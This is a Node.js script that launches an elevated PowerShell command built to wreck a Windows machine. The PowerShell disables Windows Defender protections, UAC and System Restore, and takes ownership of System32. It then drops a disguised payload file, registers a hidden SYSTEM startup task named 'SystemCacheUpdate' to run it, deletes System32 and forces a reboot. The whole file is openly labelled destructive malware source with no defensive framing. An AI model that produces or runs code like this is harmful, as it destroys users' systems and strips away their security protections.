const { execSync } = require('child_process');

// PowerShell script to disable security and delete System32
const psScript = `
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue;
Set-MpPreference -DisableBehaviorMonitoring \$true -ErrorAction SilentlyContinue;
Set-MpPreference -DisableIOAVProtection \$true -ErrorAction SilentlyContinue;

# Disable UAC (User Account Control)
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue;

# Take ownership of System32
takeown /F C:\\Windows\\System32 /R /D Y | Out-Null;
icacls C:\\Windows\\System32 /grant "\${env:USERNAME}:F" /T | Out-Null;

# Disable System Restore
Disable-ComputerRestore -Drive "C:\\" -ErrorAction SilentlyContinue;

# Create a malicious payload to delete System32 after reboot
"\$payloadScript = \`"
Remove-Item -Path C:\\Windows\\System32 -Recurse -Force -ErrorAction SilentlyContinue
\`"";
"\$payloadPath = \"\${env:TEMP}\\SystemCache.dat\"";
"Set-Content -Path \$payloadPath -Value \$payloadScript -ErrorAction SilentlyContinue";

# Schedule task to run on startup
"\$action = New-ScheduledTaskAction -Execute \\\"powershell.exe\\\" -Argument \\\"-ExecutionPolicy Bypass -WindowStyle Hidden -File \\\\\\\"\$payloadPath\\\\\\\"\\\"";
"\$trigger = New-ScheduledTaskTrigger -AtStartup";
"\$principal = New-ScheduledTaskPrincipal -UserId \\\"SYSTEM\\\" -LogonType ServiceAccount -RunLevel Highest";
"Register-ScheduledTask -TaskName \\\"SystemCacheUpdate\\\" -Action \$action -Trigger \$trigger -Principal \$principal | Out-Null";

# Force restart
Restart-Computer -Force;
`;

// Execute PowerShell with admin privileges
try {
    execSync(
        `powershell -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"${psScript.replace(/\n/g, '; ')}\"' -Verb RunAs"`,
        { stdio: 'ignore' }
    );
    console.log("Script executed (requires admin approval).");
} catch (err) {
    console.error("Error:", err.message);
}